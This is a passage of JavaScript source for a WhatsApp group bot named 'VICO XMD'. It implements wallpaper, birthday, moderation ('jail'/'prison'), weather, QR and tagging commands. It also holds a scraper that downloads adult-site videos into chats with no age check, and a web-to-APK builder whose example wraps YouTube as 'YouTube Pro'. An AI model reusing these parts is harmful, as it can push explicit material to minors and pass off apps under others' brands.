      const { data } = await axios.get('https://wallhaven.cc/api/v1/search', {
        params: { q: q, purity: '100', categories: '111', sorting: 'random', atleast: '1920x1080' },
        timeout: 20000, headers
      });
      const list = data?.data || [];
      if (list.length) {
        const pick = list[Math.floor(Math.random() * list.length)];
        const img = pick.path || pick.thumbs?.large;
        if (img) {
          await empire.sendMessage(m.chat, {
            image: { url: img },
            caption: '🖼️ *4K Wallpaper*\n🔍 ' + q
          }, { quoted: m });
          sent = true;
        }
      }
    } catch (_) {}
    // 2) unsplash source
    if (!sent) {
      try {
        const url = 'https://source.unsplash.com/1920x1080/?' + encodeURIComponent(q);
        await empire.sendMessage(m.chat, {
          image: { url },
          caption: '🖼️ *Wallpaper*\n🔍 ' + q
        }, { quoted: m });
        sent = true;
      } catch (_) {}
    }
    // 3) picsum fallback
    if (!sent) {
      const url = 'https://picsum.photos/1920/1080';
      await empire.sendMessage(m.chat, {
        image: { url },
        caption: '🖼️ *Wallpaper*\n🔍 ' + q
      }, { quoted: m });
    }
  } catch (e) {
    console.error('4k error:', e.message);
    reply('❌ Wallpaper search failed: ' + e.message);
  }
  break;
}


// ═══════════════════════════════════════════════════
// WEB2APK
// ═══════════════════════════════════════════════════
case 'web2apk':
case 'toapp':
case 'webtoapp': {
  try {
    if (!m.quoted) {
      return reply('📱 *Web to APK*\n\nReply to an *image* (icon) with:\n' + prefix + 'web2apk <url> | <app_name> | <package> | <version>\n\nExample:\n' + prefix + 'web2apk https://youtube.com | YouTube Pro | com.yt.pro | 1.0.0');
    }
    const mime = m.quoted.mimetype || '';
    if (!/image/.test(mime)) return reply('❌ Reply to an *image* to use as app icon.');
    const fullText = text || '';
    const parts = fullText.split('|').map(s => s.trim());
    const [url, appName, packageName, versionName = '1.0.0'] = parts;
    if (!url || !appName) return reply('❌ Format: ' + prefix + 'web2apk <url> | <app_name> | <package> | <version>');
    await reply('📥 Downloading icon...');
    const iconBuffer = await empire.downloadMediaMessage(m.quoted);
    if (!iconBuffer) return reply('❌ Failed to download icon.');
    await reply('🔨 Building APK... This may take a few minutes.');
    const FormData = require('form-data');
    const tmpDir = (require('path').join(require('os').tmpdir(), 'vico-tmp'));
    if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
    const iconPath = path.join(tmpDir, 'icon-' + Date.now() + '.jpg');
    fs.writeFileSync(iconPath, iconBuffer);
    const cleaned = appName.toLowerCase().replace(/[^a-z0-9]/g, '');
    const pkg = packageName || ('com.' + cleaned + '.app');
    const form = new FormData();
    form.append('websiteUrl', url);
    form.append('appName', appName);
    form.append('icon', fs.createReadStream(iconPath));
    form.append('packageName', pkg);
    form.append('versionName', versionName);
    form.append('versionCode', '1');
    const BASE_URL = 'https://webappcreator.amethystlab.org';
    const { data } = await axios.post(BASE_URL + '/api/build-apk', form, {
      headers: { ...form.getHeaders(), 'User-Agent': 'Mozilla/5.0', Origin: BASE_URL, Referer: BASE_URL + '/' },
      maxContentLength: Infinity, maxBodyLength: Infinity, timeout: 120000
    });
    try { fs.unlinkSync(iconPath); } catch (_) {}
    if (!data.success) return reply('❌ Build failed: ' + (data.message || 'Unknown'));
    const dl = BASE_URL + data.downloadUrl;
    await reply('📦 Downloading APK...');
    const apkRes = await axios.get(dl, { responseType: 'arraybuffer', timeout: 60000 });
    const apkBuffer = Buffer.from(apkRes.data);
    const fileName = appName.replace(/\s+/g, '_') + '-' + versionName + '.apk';
    await empire.sendMessage(m.chat, {
      document: apkBuffer,
      mimetype: 'application/vnd.android.package-archive',
      fileName,
      caption: '📱 *Web2APK ✅*\n\n📌 *Name:* ' + appName + '\n📦 *Package:* ' + pkg + '\n📌 *Version:* ' + versionName + '\n🔗 *URL:* ' + url,
      contextInfo: newsletterContext()
    }, { quoted: m });
  } catch (e) {
    console.error('web2apk:', e.message);
    reply('❌ Failed: ' + (e.message || 'Unknown error'));
  }
  break;
}

// ═══════════════════════════════════════════════════
// GIVEAWAY — text only
// ═══════════════════════════════════════════════════
case 'giveaway': {
  await empire.sendMessage(m.chat, {
    text: 'Join the giveaway and stand a chance to win prizes, click the link below\n\nhttps://files.catbox.moe/qcnzf1.jpg',
    contextInfo: newsletterContext()
  }, { quoted: m });
  break;
}

case 'aboutowner': {
  await empire.sendMessage(m.chat, {
    text: 'ᴍʀ ʀᴍs ,ᴛʜᴇ ᴏᴡɴᴇʀ ᴏғ ᴠɪᴄᴏ xᴍᴅ ᴀɴᴅ ʀᴍs ᴛᴇᴄʜ,ʜᴇ ʜᴀs ᴀʟᴏᴛ ᴏғ ᴘᴏʀᴛғᴏʟɪᴏ ᴀɴᴅ ᴘʀᴏᴊᴇᴄᴛs,ᴀ ᴍᴀɴ ᴡʜᴏ ʟᴏᴠᴇs ʙᴏᴏʙs,sʀʏ ʙᴏᴏᴋs 😂,ᴠᴇʀʏ ᴡᴇʟʟ ᴋɴᴏᴡʟᴇᴅɢᴇᴀʙʟᴇ ɪɴ ᴇᴠᴇʀʏ ᴀsᴘᴇᴄᴛ ᴏғ ʟɪғᴇ ᴀɴᴅ ᴅᴇᴅɪᴄᴀᴛᴇᴅ ᴛᴏ sᴄɪᴇɴᴄᴇ ᴀɴᴅ ᴛᴇᴄʜɴᴏʟᴏɢʏ,ᴛʜᴇ ᴄᴀʟʟ ʜɪᴍ ʀᴍs.',
    contextInfo: newsletterContext()
  }, { quoted: m });
  break;
}

// ═══════════════════════════════════════════════════
// BIRTHDAY
// ═══════════════════════════════════════════════════
case 'birthday': {
  const bdayWishes = [
    "May this birthday unlock new doors of favor, joy, and unstoppable progress in your life.",
    "Happy birthday! May laughter fill your days and peace guard your nights all year long.",
    "Another year wiser, stronger, and more blessed — celebrate every beautiful moment today.",
    "May God crown your new age with health, wealth, and genuine love from those who matter.",
    "Happy birthday! May every dream you whispered last year begin to bloom this season.",
    "Shine brighter than the candles on your cake — your future is glowing already.",
    "May this new year of life bring soft landings, loud victories, and quiet gratitude.",
    "Happy birthday! May favor locate you in rooms your feet have not yet entered.",
    "Age is proof you survived storms — today, celebrate the warrior you became.",
    "May joy chase you, peace keep you, and purpose guide every step this new age.",
    "Happy birthday! May your name open doors and your smile heal hearts around you.",
    "New age, new grace. May miracles meet you on ordinary days.",
    "May your table never lack bread, your heart never lack love, your path never lack light.",
    "Happy birthday! May this chapter be your softest and strongest yet.",
    "You are not just older — you are upgraded. Celebrate the version of you rising now.",
    "May divine speed rewrite delays and turn waiting seasons into winning seasons.",
    "Happy birthday! May friends stay true, opportunities stay near, and fear stay far.",
    "May your cup overflow with peace that money cannot buy and joy that trials cannot steal.",
    "Another trip around the sun — may this orbit bring clarity, courage, and celebration.",
    "Happy birthday! May every tear of the past water the garden of your next harvest.",
    "May long life, good health, and pure laughter be the soundtrack of your new age.",
    "Rise into this birthday like sunrise — gentle, golden, and impossible to ignore.",
    "Happy birthday! May answered prayers arrive dressed as ordinary moments this year.",
    "May your plans succeed, your heart stay soft, and your spirit stay bold.",
    "Celebrate loudly today — heaven already stamped this year with favor for you."
  ];
  const pick = bdayWishes[Math.floor(Math.random() * bdayWishes.length)];
  const when = moment().tz('Africa/Lagos').format('dddd, DD MMMM YYYY • hh:mm A');
  const wishes =
    `🎂 *HAPPY BIRTHDAY*\n\n` +
    `📅 ${when}\n\n` +
    `${pick}\n\n` +
    `🙏 *God bless you richly.* — VICO XMD`;
  await empire.sendMessage(m.chat, { text: wishes }, { quoted: m });
  try {
    try {
      const audioRes = await axios.get('https://files.catbox.moe/7p0ad0.mp3', { responseType: 'arraybuffer', timeout: 45000 });
      const audioBuffer = Buffer.from(audioRes.data);
      if (audioBuffer.length > 1000) {
        await empire.sendMessage(m.chat, {
          audio: audioBuffer,
          mimetype: 'audio/mpeg',
          ptt: false,
          fileName: 'birthday.mp3'
        }, { quoted: m });
      } else throw new Error('empty');
    } catch (e1) {
      await empire.sendMessage(m.chat, {
        audio: { url: 'https://files.catbox.moe/7p0ad0.mp3' },
        mimetype: 'audio/mpeg',
        ptt: false,
        fileName: 'birthday.mp3'
      }, { quoted: m });
    }
  } catch (e) {
    console.error('birthday audio:', e.message);
  }
  break;
}

// ═══════════════════════════════════════════════════
// VV3 — silent, bot user DM only
// ═══════════════════════════════════════════════════
/* vv4 removed */

case 'xnxx':
case 'xv':
case 'xvideo': {
  try {
    const query = (args && args.length) ? args.join(' ') : (text || '').trim();
    if (!query) {
      return reply(
        '⚠️ Provide a search or an XNXX link.\n\n' +
        '*Example:* ' + prefix + 'xnxx college stepmother\n' +
        '*Example:* ' + prefix + 'xnxx https://www.xnxx.com/video-xxxx/title'
      );
    }

    await empire.sendMessage(m.chat, { react: { text: '🔍', key: m.key } }).catch(() => {});

    // ─── DOWNLOAD VIA URL ───────────────────────────────
    if (/xnxx\.com/i.test(query)) {
      await empire.sendMessage(m.chat, { react: { text: '📥', key: m.key } }).catch(() => {});

      const { data } = await axios.get(query, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': 'https://www.xnxx.com/'
        },
        timeout: 30000
      });

      const $ = require('cheerio').load(data);
      const title =
        $('meta[property="og:title"]').attr('content') ||
        $('title').text() ||
        'XNXX Video';

      // Collect all script text (page may split player config)
      let scriptHtml = '';
      $('script').each((_, el) => { scriptHtml += $(el).html() || ''; });

      // Multiple patterns (XNXX changed format several times)
      const patterns = [
        /html5player\.setVideoUrlHigh\(['"]([^'"]+)['"]\)/i,
        /html5player\.setVideoUrlLow\(['"]([^'"]+)['"]\)/i,
        /setVideoUrlHigh\(['"]([^'"]+)['"]\)/i,
        /setVideoUrlLow\(['"]([^'"]+)['"]\)/i,
        /"contentUrl"\s*:\s*"([^"]+\.mp4[^"]*)"/i,
        /contentUrl["']?\s*:\s*["']([^"']+\.mp4[^"']*)["']/i,
        /(https?:\/\/[^"'\\s]+\.mp4[^"'\\s]*)/gi
      ];

      let videoUrl = null;
      for (const re of patterns) {
        const mth = scriptHtml.match(re);
        if (mth && mth[1] && /\.mp4/i.test(mth[1])) {
          videoUrl = mth[1].replace(/\\u0026/g, '&').replace(/\\/g, '');
          break;
        }
        // global mp4 sweep — take first reasonable hit
        if (re.global && mth) {
          for (const hit of scriptHtml.match(re) || []) {
            if (/\.mp4/i.test(hit) && /xnxx|video|cdn|cdn\d/i.test(hit)) {
              videoUrl = hit.replace(/\\u0026/g, '&').replace(/\\/g, '');
              break;
            }
          }
          if (videoUrl) break;
        }
      }

      // Fallback: og:video meta
      if (!videoUrl) {
        const og =
          $('meta[property="og:video"]').attr('content') ||
          $('meta[property="og:video:url"]').attr('content') ||
          $('meta[property="og:video:secure_url"]').attr('content');
        if (og && /\.mp4|video/i.test(og)) videoUrl = og;
      }

      if (!videoUrl) {
        return reply('❌ Could not find direct video links. Video may be private, deleted, or page layout changed.');
      }

      // Download to buffer so WhatsApp gets a real playable video
      const vidRes = await axios.get(videoUrl, {
        responseType: 'arraybuffer',
        timeout: 120000,
        maxContentLength: 90 * 1024 * 1024,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Referer': 'https://www.xnxx.com/'
        }
      });
      const videoBuffer = Buffer.from(vidRes.data);

      if (!videoBuffer || videoBuffer.length < 20000) {
        return reply('❌ Video file empty or too small.');
      }

      await empire.sendMessage(m.chat, {
        video: videoBuffer,
        caption:
          '🔞 *XNXX DOWNLOAD*\n\n' +
          '📌 *Title:* ' + title + '\n' +
          '💎 *Quality:* High / HD (best found)\n\n' +
          '✅ _Playable video_',
        mimetype: 'video/mp4',
        contextInfo: newsletterContext()
      }, { quoted: m });
      break;
    }

    // ─── SEARCH ─────────────────────────────────────────
    const searchUrl = 'https://www.xnxx.com/search/' + encodeURIComponent(query);
    const { data: html } = await axios.get(searchUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': 'https://www.xnxx.com/'
      },
      timeout: 30000
    });
    const $ = require('cheerio').load(html);
    const results = [];

    $('.mozaique .thumb-block').each((i, el) => {
      if (i >= 10) return;
      const title = $(el).find('.thumb-under a').attr('title');
      const href = $(el).find('.thumb-under a').attr('href');
      const link = href ? (href.startsWith('http') ? href : 'https://www.xnxx.com' + href) : null;
      const thumbnail =
        $(el).find('.thumb img').attr('data-src') ||
        $(el).find('.thumb img').attr('src');
      const duration = $(el).find('.duration').text();
      if (title && link) results.push({ title, link, thumbnail, duration });
    });

    if (!results.length) return reply('❌ No results found for that search.');

    let responseText = '🔞 *XNXX SEARCH RESULTS*\n_Query: ' + query + '_\n\n';
    results.forEach((video, index) => {
      responseText += '*' + (index + 1) + '.* ' + video.title + '\n';
      responseText += '⏱️ *Duration:* ' + (video.duration || 'N/A') + '\n';
      responseText += '🔗 ' + video.link + '\n\n';
    });
    responseText += '💡 *To download:* Copy a link and type:\n' + prefix + 'xnxx <link>';

    if (results[0].thumbnail) {
      await empire.sendMessage(m.chat, {
        image: { url: results[0].thumbnail },
        caption: responseText.slice(0, 3000),
        contextInfo: newsletterContext()
      }, { quoted: m });
    } else {
      await reply(responseText.slice(0, 4000));
    }
  } catch (e) {
    console.error('[xvideo/xnxx]', e.message);
    reply('❌ Error: ' + (e.message || 'Could not process the request.'));
  }
  break;
}

case 'owner': {
    try {
        const ownerNum = '2348122766645';
        const ownerName = global.OWNER_NAME || '𝐌𝐑 𝐑𝐌𝐒 𓉳';

        const vcard =
            'BEGIN:VCARD\n' +
            'VERSION:3.0\n' +
            `FN:${ownerName}\n` +
            `ORG:${global.botName || 'VICO XMD'};\n` +
            `TEL;type=CELL;type=VOICE;waid=${ownerNum}:+${ownerNum}\n` +
            'END:VCARD';

        await empire.sendMessage(m.chat, {
            contacts: {
                displayName: ownerName,
                contacts: [{ vcard }]
            },
            contextInfo: newsletterContext()
        }, { quoted: m });

    } catch (e) {
        reply(`❌ Failed to send contact: ${e.message}`);
    }
    break;
}

case 'sensi':
case 'sensitivity': {
    const q = (text || args.join(' ') || '').trim();
    if (!q) {
        return reply(
`🎮 *SENSI GENERATOR*\n\n` +
`Usage: ${prefix}sensi <phone model>\n` +
`Example: ${prefix}sensi Infinix Hot 40i\n` +
`Example: ${prefix}sensi Tecno Spark 10\n` +
`Example: ${prefix}sensi iPhone 13`
        );
    }
    // Deterministic seed from model name so same phone gets stable sensible values
    let seed = 0;
    const model = q.toLowerCase().replace(/\s+/g, ' ').trim();
    for (let i = 0; i < model.length; i++) seed = (seed * 31 + model.charCodeAt(i)) >>> 0;
    const rnd = (min, max) => {
        seed = (seed * 1103515245 + 12345) >>> 0;
        return min + (seed % (max - min + 1));
    };
    const isIOS = /iphone|ipad|ios/i.test(model);
    const isHigh = /flagship|s2[3-9]|s1[5-9]|pixel [6-9]|iphone 1[2-9]|redmi k|poco f|iqoo|rog/i.test(model);
    const base = isHigh ? 95 : isIOS ? 90 : 85;
    const general = rnd(base - 8, base + 5);
    const redDot = rnd(general - 6, general + 4);
    const scope = rnd(general - 10, general - 2);
    const freeLook = rnd(70, 98);
    const dpi = isIOS ? rnd(380, 460) : rnd(280, 480);
    const fireBtn = ['Right', 'Left', 'Both'][rnd(0, 2)];
    const textOut =
`🎮 *FREE FIRE SENSI*\n` +
`📱 *Device:* ${q}\n\n` +
`• *General:* ${general}\n` +
`• *Red Dot:* ${redDot}\n` +
`• *2x Scope:* ${Math.max(60, scope)}\n` +
`• *4x Scope:* ${Math.max(55, scope - rnd(2, 8))}\n` +
`• *AWM Scope:* ${Math.max(50, scope - rnd(5, 12))}\n` +
`• *Free Look:* ${freeLook}\n` +
`• *DPI:* ${dpi}\n` +
`• *Fire Button:* ${fireBtn}\n\n` +
`💡 Tips: turn off precision wing if drag is heavy. Test in training for 2 minutes.\n` +
`_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠɪᴄᴏ xᴍᴅ ༒_`;
    reply(textOut);
    break;
}


        // ═══════════════════════════════════════════════════
        // 18. JAIL/UNJAIL
        // ═══════════════════════════════════════════════════
        case 'mute':
        case 'jail': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            if (!isBotAdmins) return reply("❌ Bot must be admin to jail (needs delete permission).");
            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
            if (!target) return reply(`Usage: ${prefix}jail @user <reason>`);
            if (target === botNumber) return reply("❌ Can't jail the bot!");
            if (groupAdmins.includes(target) || isGroupAdmin(groupMetadata, [target])) {
                return reply("❌ Admins cannot be jailed or prisoned.");
            }
            const reason = text.replace(/@\S+/g, '').trim() || "No reason";
            if (!db.jailed) db.jailed = {};
            if (!db.jailed[m.chat]) db.jailed[m.chat] = {};
            const jailEntry = { reason, until: Date.now() + 60 * 60 * 1000, by: m.sender, ids: [target] };
            try {
                const alt = getSenderIds({ sender: target, key: { participant: target, remoteJid: m.chat } }) || [];
                for (const id of alt) if (id && !jailEntry.ids.includes(id)) jailEntry.ids.push(id);
            } catch (_) {}
            for (const id of jailEntry.ids) db.jailed[m.chat][id] = jailEntry;

            saveDB();
            await empire.sendMessage(m.chat, {
                text: `🔒 *JAILED*\n👤 @${target.split('@')[0]}\n📌 ${reason}\n⏱️ 1 hour\n\n_All their messages (text/sticker/image/voice) will be deleted._`,
                mentions: [target],
                contextInfo: newsletterContext({ mentionedJid: [target] })
            }, { quoted: m });
            break;
        }

        // ═══════════════════════════════════════════════════
        // Prison - Jail with custom duration
        // Usage: .prison @user 5min Talking too much
        //        .prison 10hours spam
        //        reply to user → .prison 2d reason
        // ═══════════════════════════════════════════════════
        case 'prison': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            if (!isBotAdmins) return reply("❌ Bot must be admin to prison (needs delete permission).");

            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
            if (target && (groupAdmins.includes(target) || isGroupAdmin(groupMetadata, [target]))) {
                return reply("❌ Admins cannot be jailed or prisoned.");
            }
            if (!target) {
                return reply(
                    `🔒 *prison*\n\n` +
                    `*Usage:*\n` +
                    `› ${prefix}prison @user <time> <reason>\n` +
                    `› Reply to user + ${prefix}prison <time> <reason>\n\n` +
                    `*Time examples:*\n` +
                    `› 30sec / 5min / 2hours / 1d / 3days\n\n` +
                    `*Example:*\n` +
                    `› ${prefix}prison @user 6min Talking too much`
                );
            }
            if (target === botNumber) return reply("❌ Can't jail the bot!");

            // Parse duration from text (e.g. 5min, 2d, 10hours, 30sec)
            const durationMatch = (text || '').match(/(\d+)\s*(sec|secs|second|seconds|min|mins|minute|minutes|hour|hours|hr|hrs|d|day|days)\b/i);
            if (!durationMatch) {
                return reply(
                    `❌ Missing or invalid time!\n\n` +
                    `*Examples:*\n` +
                    `› ${prefix}prison @user 5min reason\n` +
                    `› ${prefix}prison @user 2hours spam\n` +
                    `› ${prefix}prison @user 1d`
                );
            }

            const amount = parseInt(durationMatch[1]);
            const unit = durationMatch[2].toLowerCase();
            let ms = 0;
            let label = '';

            if (/^sec|secs|second|seconds$/.test(unit)) {
                ms = amount * 1000;
                label = `${amount} second${amount > 1 ? 's' : ''}`;
            } else if (/^min|mins|minute|minutes$/.test(unit)) {
                ms = amount * 60 * 1000;
                label = `${amount} minute${amount > 1 ? 's' : ''}`;
            } else if (/^hour|hours|hr|hrs$/.test(unit)) {
                ms = amount * 60 * 60 * 1000;
                label = `${amount} hour${amount > 1 ? 's' : ''}`;
            } else if (/^d|day|days$/.test(unit)) {
                ms = amount * 24 * 60 * 60 * 1000;
                label = `${amount} day${amount > 1 ? 's' : ''}`;
            }

            // Max 30 days safety
            if (ms > 30 * 24 * 60 * 60 * 1000) {
                return reply('❌ Max jail time is 30 days.');
            }
            if (ms < 1000) {
                return reply('❌ Minimum jail time is 1 second.');
            }

            // Reason = everything after the duration token
            let reason = (text || '')
                .replace(/@\S+/g, '')
                .replace(durationMatch[0], '')
                .trim() || 'No reason';

            if (!db.jailed) db.jailed = {};
            if (!db.jailed[m.chat]) db.jailed[m.chat] = {};
            const jailEntry = {
                reason,
                until: Date.now() + ms,
                by: m.sender,
                ids: [target]
            };
            try {
                const alt = getSenderIds({ sender: target, key: { participant: target, remoteJid: m.chat } }) || [];
                for (const id of alt) if (id && !jailEntry.ids.includes(id)) jailEntry.ids.push(id);
            } catch (_) {}
            for (const id of jailEntry.ids) db.jailed[m.chat][id] = jailEntry;

            saveDB();

            await empire.sendMessage(m.chat, {
                text:
                    `🔒 *JAILED*\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 @${target.split('@')[0]}\n` +
                    `📌 Reason: ${reason}\n` +
                    `⏱️ Duration: *${label}*\n` +
                    `👮 By: @${m.sender.split('@')[0]}\n\n` +
                    `_Any message they send will be deleted until time is up._`,
                mentions: [target, m.sender],
                contextInfo: newsletterContext({ mentionedJid: [target, m.sender] })
            }, { quoted: m });
            break;
        }

        case 'unjail':
        case 'release': {
            if (!isGroup) return reply("👥 Group only!");
            if (!isCreator && !isAdmins) return reply("❌ Admins only!");
            let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
            if (!target) return reply(`Usage: ${prefix}unjail @user`);
            let released = false;
            if (db.jailed?.[m.chat]) {
                for (const [jid, data] of Object.entries(db.jailed[m.chat])) {
                    if (sameIdentity(jid, target) || jid === target || (data?.ids && data.ids.some(id => sameIdentity(id, target)))) {
                        delete db.jailed[m.chat][jid];
                        released = true;
                    }
                }
                if (released) saveDB();
            }
            if (released) {
                await empire.sendMessage(m.chat, { 
                    text: `🔓 @${target.split('@')[0]} released!`, 
                    mentions: [target],
                    contextInfo: newsletterContext({ mentionedJid: [target] })
                }, { quoted: m });
            } else {
                reply(`❌ User is not jailed.`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // 19. BALANCE
        // ═══════════════════════════════════════════════════
        case 'balance':
        case 'bal': {
            const target = m.mentionedJid?.[0] || m.sender;
            const acc = ensureEconomy(target);
            reply(
`💰 *BALANCE*
👤 @${target.split('@')[0]}
👛 Wallet: ${fmtCoins(acc.wallet)} coins
🏦 Bank: ${fmtCoins(acc.bank)} coins
💎 Total: ${fmtCoins(acc.wallet + acc.bank)} coins`
            );
            break;
        }

        // ═══════════════════════════════════════════════════
        // 23. QR CODE GENERATOR
        // ═══════════════════════════════════════════════════
        case 'qr': {
            if (!text) return reply(`🔳 Usage: ${prefix}qr <text or link>`);
            try {
                const url = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(text)}`;
                await empire.sendMessage(m.chat, {
                    image: { url },
                    caption: `🔳 *QR Code*\n➤ ${text}`,
                    contextInfo: newsletterContext()
                }, { quoted: m });
            } catch (e) {
                reply(`❌ Failed to generate QR code: ${e.message}`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // 24. WEATHER
        // ═══════════════════════════════════════════════════
        case 'weather': {
            if (!text) return reply(`🌦️ Usage: ${prefix}weather <city>`);
            try {
                const res = await axios.get(`https://wttr.in/${encodeURIComponent(text)}?format=%l:+%c+%t+(feels+%f)+|+💧%h+|+💨%w`, { timeout: 15000 });
                reply(`🌦️ *WEATHER*\n➤ ${res.data}`);
            } catch (e) {
                reply(`❌ Couldn't fetch weather for "${text}".`);
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // 26. DAD JOKE
        // ═══════════════════════════════════════════════════
        case 'joke': {
            try {
                const res = await axios.get('https://icanhazdadjoke.com/', {
                    headers: { Accept: 'application/json' },
                    timeout: 15000
                });
                reply(`😂 *JOKE*\n\n${res.data.joke}`);
            } catch (e) {
                reply('❌ Couldn\'t fetch a joke right now, try again shortly.');
            }
            break;
        }

        // ═══════════════════════════════════════════════════
        // 27. URL SHORTENER
        // ═══════════════════════════════════════════════════
        case 'short':
        case 'shorturl': {
            if (!text) return reply(`🔗 Usage: ${prefix}short <url>`);
            try {
                const res = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`, { timeout: 15000 });
                reply(`🔗 *SHORT LINK*\n➤ ${res.data}`);
            } catch (e) {
                reply('❌ Failed to shorten that URL.');
            }
            break;
        }


        // ═══════════════════════════════════════════════════════════
        // VICO XMD — 50 NEW GROUP / INTERACTIVE / GAME / HTML COMMANDS
        // ═══════════════════════════════════════════════════════════

        case 'admins':
        case 'admin':
        case 'groupadmins': {
            if (!isGroup) return reply(mess.only.group);
            const admins = groupAdmins.map(id => `• @${id.split('@')[0]}`).join('\n');
            return empire.sendMessage(m.chat, { text: `👑 *GROUP ADMINS*\n\n${admins}`, mentions: groupAdmins, contextInfo: newsletterContext() }, { quoted: m });
        }

        case 'members':
        case 'groupmembers': {
            if (!isGroup) return reply(mess.only.group);
            return reply(`👥 *${groupName}*\n\nMembers: *${participants.length}*\nAdmins: *${groupAdmins.length}*\nGroup ID: \`${m.chat}\``);
        }

        case 'groupid': {
            if (!isGroup) return reply(mess.only.group);
            return reply(`🆔 *GROUP ID*\n\n\`${m.chat}\``);
        }

        case 'link':
        case 'grouplink': {
            if (!isGroup) return reply(mess.only.group);
            if (!isAdmins && !isCreator) return reply(mess.only.admin);
            if (!isBotAdmins) return reply(mess.only.badmin);
            const code = await empire.groupInviteCode(m.chat).catch(() => null);
            return reply(code ? `🔗 *GROUP LINK*\nhttps://chat.whatsapp.com/${code}` : '❌ Unable to get group link.');
        }

        case 'tagadmins': {
            if (!isGroup) return reply(mess.only.group);
            const msg = q || '📢 Admins, attention please!';
            return empire.sendMessage(m.chat, { text: `${msg}\n\n${groupAdmins.map(id => `@${id.split('@')[0]}`).join(' ')}`, mentions: groupAdmins, contextInfo: newsletterContext() }, { quoted: m });
        }

        case 'tagall2': {
            if (!isGroup) return reply(mess.only.group);
            if (!isAdmins && !isCreator) return reply(mess.only.admin);
            const msg = q || '📢 Everyone!';
            return empire.sendMessage(m.chat, { text: `${msg}\n\n${participants.map(p => `@${p.id.split('@')[0]}`).join(' ')}`, mentions: participants.map(p => p.id), contextInfo: newsletterContext() }, { quoted: m });
        }

        case 'groupstats': {
            if (!isGroup) return reply(mess.only.group);
            const bots = participants.filter(p => /@s\.whatsapp\.net$/.test(p.id) && p.id !== m.sender).length;
            return reply(`📊 *GROUP STATS*\n\n👥 Members: ${participants.length}\n👑 Admins: ${groupAdmins.length}\n🤖 Accounts: ${bots}\n📝 Name: ${groupName}`);
        }

        case 'grouptime': {
            if (!isGroup) return reply(mess.only.group);
            return reply(`🕐 *GROUP TIME*\n\n${new Date().toLocaleString('en-NG', { timeZone: 'Africa/Lagos' })}\n📍 Nigeria (WAT)`);
        }

        case 'groupcount': {
            if (!isGroup) return reply(mess.only.group);
            return reply(`🔢 *${groupName}* has *${participants.length}* members.`);
        }

        case 'groupowner6': {
            if (!isGroup) return reply(mess.only.group);
            const ownerP = participants.find(p => p.admin === 'superadmin')?.id;
            return ownerP ? empire.sendMessage(m.chat, { text: `👑 *GROUP OWNER*\n\n@${ownerP.split('@')[0]}`, mentions: [ownerP], contextInfo: newsletterContext() }, { quoted: m }) : reply('ℹ️ Group owner is not available.');
        }

        case 'setwelcome2': {
            if (!isGroup) return reply(mess.only.group);
            if (!isAdmins && !isCreator) return reply(mess.only.admin);
            if (!q) return reply(`Usage: ${prefix}setwelcome2 on | off | <message>`);
            const opt = q.toLowerCase();
            if (opt === 'on' || opt === 'off') setSetting(m.chat, 'welcome', opt === 'on');
            else setSetting(m.chat, 'welcomeMessage', q), setSetting(m.chat, 'welcome', true);
            return reply(`👋 *WELCOME:* ${opt === 'off' ? 'OFF' : 'ON'}${opt !== 'on' && opt !== 'off' ? `\nMessage: ${q}` : ''}`);
        }

        case 'setgoodbye2': {
            if (!isGroup) return reply(mess.only.group);
            if (!isAdmins && !isCreator) return reply(mess.only.admin);
            if (!q) return reply(`Usage: ${prefix}setgoodbye2 on | off | <message>`);
            const opt = q.toLowerCase();
            if (opt === 'on' || opt === 'off') setSetting(m.chat, 'goodbye', opt === 'on');
            else setSetting(m.chat, 'goodbyeMessage', q), setSetting(m.chat, 'goodbye', true);
            return reply(`👋 *GOODBYE:* ${opt === 'off' ? 'OFF' : 'ON'}`);
        }

        case 'adminlist':
        case 'admins2': {
            if (!isGroup) return reply(mess.only.group);
            const mentions = groupAdmins;
            const text = `👑 *GROUP ADMINS*\n\n${mentions.map((id,i)=>`${i+1}. @${id.split('@')[0]}`).join('\n')}`;
            return empire.sendMessage(m.chat,{text,mentions,contextInfo:newsletterContext({mentionedJid:mentions})},{quoted:m});
        }

        case 'nonadmins': {
            if (!isGroup) return reply(mess.only.group);
            const admins = new Set(groupAdmins);
            const list = participants.filter(p=>!admins.has(p.id));
            if (!list.length) return reply('👥 Everyone in this group is an admin.');
            const mentions=list.map(p=>p.id);
            return empire.sendMessage(m.chat,{text:`👥 *NON-ADMINS (${list.length})*\n\n${mentions.map(id=>`• @${id.split('@')[0]}`).join('\n')}`,mentions,contextInfo:newsletterContext({mentionedJid:mentions})},{quoted:m});
        }

        case 'hidetag':
        case 'silenttag': {
            if (!isGroup) return reply(mess.only.group);
            if (!isCreator && !isAdmins) return reply(mess.only.admin);
            const hiddenText = q || '📢 Attention everyone!';
            const mentions = participants.map(p=>p.id);
            return empire.sendMessage(m.chat,{text:hiddenText,mentions,contextInfo:newsletterContext({mentionedJid:mentions})},{quoted:m});
        }

        case 'tag':
        case 'mentionall': {
            if (!isGroup) return reply(mess.only.group);
            if (!isCreator && !isAdmins) return reply(mess.only.admin);
            const mentions=participants.map(p=>p.id);
